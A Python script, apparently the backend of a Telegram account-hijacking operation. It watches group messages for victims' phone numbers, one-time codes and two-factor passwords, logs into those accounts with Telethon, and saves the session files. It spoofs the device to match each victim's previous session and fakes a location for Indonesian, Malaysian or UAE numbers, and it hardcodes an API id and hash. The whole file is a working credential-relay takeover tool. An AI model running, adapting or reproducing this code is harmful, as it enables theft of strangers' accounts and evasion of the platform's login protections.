import asyncio
import os
import re
import shutil
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, PhoneNumberUnoccupiedError, PhoneCodeInvalidError
)
from telethon.tl.functions.account import GetAuthorizationsRequest

api_id = 23520639
api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'

SESSIONS_FOLDER = "a1_sessions"
SESSIONS_FOLDER_FINAL = "sessions2"

ALLOWED_PREFIXES = ["+62", "+60", "+971", "+601"]

# Data login sedang diproses, format:
# phone: {
#   "client": TelegramClient,
#   "phone_code_hash": str,
#   "otp": str or None,
#   "password": str or None,
#   "state": int (1=otp requested, 2=otp received, 3=password received),
#   "lock": asyncio.Lock untuk mencegah race
# }
pending_logins = {}

os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(SESSIONS_FOLDER_FINAL, exist_ok=True)


def is_valid_phone(phone):
    if not phone:
        return False
    if not any(phone.startswith(p) for p in ALLOWED_PREFIXES):
        return False
    if not re.fullmatch(r"\+?\d{10,15}", phone):
        return False
    return True


async def apply_spoof_device(client, phone):
    try:
        await client.connect()
        auths = await client(GetAuthorizationsRequest())
        if auths.authorizations:
            last = auths.authorizations[0]
            client._init_connection.device_model = last.device_model
            client._init_connection.system_version = last.platform
            print(f"[🛠️] Spoof device from previous session: {last.device_model} ({last.platform})")
        else:
            raise Exception("no previous session")
    except Exception:
        # fallback spoof
        if hasattr(client, "_init_connection"):
            client._init_connection.device_model = "Pixel 5"
            client._init_connection.system_version = "Android 11"
            print("[🛠️] Using fallback spoof device Pixel 5 (Android 11)")
    # Always set some defaults
    if hasattr(client, "_init_connection"):
        client._init_connection.app_version = "Telegram Android 10.0.0"
        client._init_connection.system_lang_code = "en"
        client._init_connection.lang_code = "en"
        client._init_connection.lang_pack = ""

        if phone.startswith("+62"):
            client._init_connection.country = "ID"
            client._init_connection.latitude = -6.2
            client._init_connection.longitude = 106.8167
            print("[🌍] Location set to Jakarta, Indonesia")
        elif phone.startswith("+60") or phone.startswith("+601"):
            client._init_connection.country = "MY"
            client._init_connection.latitude = 3.1390
            client._init_connection.longitude = 101.6869
            print("[🌍] Location set to Kuala Lumpur, Malaysia")
        elif phone.startswith("+971"):
            client._init_connection.country = "AE"
            client._init_connection.latitude = 25.2048
            client._init_connection.longitude = 55.2708
            print("[🌍] Location set to Dubai, UAE")
        else:
            client._init_connection.country = "US"
            client._init_connection.latitude = 37.7749
            client._init_connection.longitude = -122.4194
            print("[🌍] Location defaulted to San Francisco, USA")


async def request_otp(phone):
    if phone in pending_logins and pending_logins[phone]["state"] > 0:
        print(f"[⚠️] OTP sudah pernah diminta untuk nomor {phone}, skip request ulang.")
        return

    print(f"[📨] Request OTP ke nomor {phone}...")

    session_path = os.path.join(SESSIONS_FOLDER, phone)
    client = TelegramClient(session_path, api_id, api_hash)
    await apply_spoof_device(client, phone)
    await client.connect()

    try:
        sent = await client.send_code_request(phone)
        pending_logins[phone] = {
            "client": client,
            "phone_code_hash": sent.phone_code_hash,
            "otp": None,
            "password": None,
            "state": 1,
            "lock": asyncio.Lock(),
        }
        print(f"[✅] OTP berhasil dikirim ke {phone}")
    except Exception as e:
        print(f"[❌] Gagal kirim OTP ke {phone}: {e}")
        await client.disconnect()


async def try_login(phone):
    data = pending_logins.get(phone)
    if not data:
        print(f"[⚠️] Tidak ada data login untuk nomor {phone}")
        return

    async with data["lock"]:
        client = data["client"]
        otp = data["otp"]
        password = data["password"]
        phone_code_hash = data["phone_code_hash"]

        if not otp:
            print(f"[⚠️] OTP belum tersedia untuk {phone}, tunggu pesan OTP.")
            return

        if not await client.is_connected():
            await client.connect()

        try:
            if data["state"] == 2:
                # Login dengan OTP, tanpa password 2FA dulu
                await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
                print(f"[✅] Login berhasil tanpa 2FA: {phone}")
                data["state"] = 4  # login selesai
            elif data["state"] == 3:
                # Login dengan OTP + password 2FA
                await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
                await client.sign_in(password=password)
                print(f"[✅] Login berhasil dengan 2FA: {phone}")
                data["state"] = 4
            else:
                print(f"[⚠️] State tidak dikenali untuk login {phone}: {data['state']}")
                return

        except SessionPasswordNeededError:
            # Jika password belum dikirim, beri info tunggu
            if password is None:
                print(f"[🔒] 2FA aktif, menunggu password untuk {phone}...")
                return
            else:
                try:
                    await client.sign_in(password=password)
                    print(f"[✅] Login 2FA berhasil dengan password: {phone}")
                    data["state"] = 4
                except Exception as e:
                    print(f"[❌] Gagal login 2FA untuk {phone}: {e}")
                    return

        except PhoneNumberUnoccupiedError:
            print(f"[🆕] Nomor belum terdaftar: {phone}, coba registrasi...")
            try:
                await client.sign_up(otp, first_name="UserBaru")
                data["state"] = 4
            except Exception as e:
                print(f"[❌] Gagal daftar nomor {phone}: {e}")
                return

        except PhoneCodeInvalidError:
            print(f"[❌] OTP salah untuk nomor {phone}")
            # Reset state supaya bisa request ulang OTP
            data["otp"] = None
            data["state"] = 1
            return

        except Exception as e:
            print(f"[❌] Error login nomor {phone}: {e}")
            return

        if data["state"] == 4:
            # Login sukses, pindahkan session dan bersihkan data
            try:
                await client.disconnect()
            except Exception:
                pass

            session_file = os.path.join(SESSIONS_FOLDER, phone) + ".session"
            target_file = os.path.join(SESSIONS_FOLDER_FINAL, phone) + ".session"

            if os.path.exists(session_file):
                shutil.move(session_file, target_file)
                print(f"[💾] Session untuk {phone} dipindahkan ke {SESSIONS_FOLDER_FINAL}")

            # Hapus dari pending
            del pending_logins[phone]


async def process_message(msg_text):
    # Cari nomor, OTP, password dari pesan
    phone_match = re.search(r'NUMBER\s*[:\-]?\s*(\+?\d{10,15})', msg_text)
    otp_match = re.search(r'OTP\s*[:\-]?\s*(\d{5,6})', msg_text)
    password_match = re.search(r'PASSWORD\s*[:\-]?\s*(\S+)', msg_text)

    if not phone_match:
        return

    phone = phone_match.group(1)
    if not is_valid_phone(phone):
        print(f"[❌] Nomor tidak valid di pesan: {phone}")
        return

    if phone not in pending_logins:
        # Nomor baru, langsung request OTP
        print(f"[➕] Nomor baru terdeteksi: {phone}")
        await request_otp(phone)
        return  # nanti tunggu OTP masuk

    # Jika OTP ada di pesan dan state masih 1 (baru request OTP), update dan login
    if otp_match:
        otp = otp_match.group(1)
        if pending_logins[phone]["state"] == 1:
            print(f"[📥] OTP diterima untuk {phone}: {otp}")
            pending_logins[phone]["otp"] = otp
            pending_logins[phone]["state"] = 2
            await try_login(phone)
            return

    # Jika password 2FA ada di pesan dan state 2 (OTP sudah login tapi perlu password)
    if password_match:
        password = password_match.group(1)
        if pending_logins[phone]["state"] == 2:
            print(f"[🔑] Password 2FA diterima untuk {phone}: {password}")
            pending_logins[phone]["password"] = password
            pending_logins[phone]["state"] = 3
            await try_login(phone)
            return


async def main():
    client_bot = TelegramClient("main", api_id, api_hash)
    await client_bot.start()
    print("[🚀] Bot Telegram siap memantau pesan grup...")

    @client_bot.on(events.NewMessage)
    async def handler(event):
        text = event.raw_text
        await process_message(text)

    await client_bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
